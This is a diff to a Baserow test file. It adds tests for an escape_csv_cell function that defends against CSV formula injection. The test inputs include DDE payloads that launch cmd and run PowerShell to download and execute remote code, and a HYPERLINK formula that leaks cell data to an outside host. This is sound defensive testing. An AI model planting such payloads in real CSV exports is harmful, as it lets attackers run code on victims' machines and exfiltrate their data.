@@ -16,6 +16,7 @@ from baserow.core.utils import (
     Progress,
     atomic_if_not_already,
     dict_to_object,
+    escape_csv_cell,
     extract_allowed,
     find_intermediate_order,
     find_unused_name,
@@ -511,3 +512,68 @@ def nested_dict():
 def test_get_nested_value_from_dict(nested_dict, value_path, expected_result):
     result = get_nested_value_from_dict(nested_dict, value_path)
     assert result == expected_result
+
+
+@pytest.mark.parametrize(
+    "input,expected",
+    [
+        # Sample dangerous payloads
+        ("=1+1", "'=1+1"),
+        ("-1+1", "'-1+1"),
+        ("+1+1", "'+1+1"),
+        ("=1+1", "'=1+1"),
+        ("@A3", "'@A3"),
+        ("%1", "'%1"),
+        ("|1+1", "'\\|1+1"),
+        ("=1|2", "'=1\\|2"),
+        # https://blog.zsec.uk/csv-dangers-mitigations/
+        ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
+        (
+            "=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
+            "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
+        ),
+        ("@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd\\|' /C calc'!A0"),
+        (
+            "@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
+            "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
+        ),
+        # https://hackerone.com/reports/72785
+        ("-2+3+cmd|' /C calc'!A0", "'-2+3+cmd\\|' /C calc'!A0"),
+        # https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities
+        (
+            '=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
+            '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
+        ),
+    ],
+)
+def test_dangerous_sample_payloads(input, expected):
+    assert escape_csv_cell(input) == expected
+
+
+@pytest.mark.parametrize(
+    "input",
+    [
+        "1+2",
+        "1",
+        "Foo",
+        "1.3",
+        "1,2",
+        "-1.3",
+        "-1,2",
+        "Foo Bar",
+        "1-2",
+        "1=3",
+        "foo@example.org",
+        "19.00 %",
+        "Test | Foo",
+        "",
+        None,
+    ],
+)
+def test_safe_sample_payloads(input):
+    assert escape_csv_cell(input) == (str(input) if input is not None else "")
+
+
+@pytest.mark.parametrize("input", [1, 2, True])
+def test_safe_nonstr_sample_payloads(input):
+    assert escape_csv_cell(input) == input
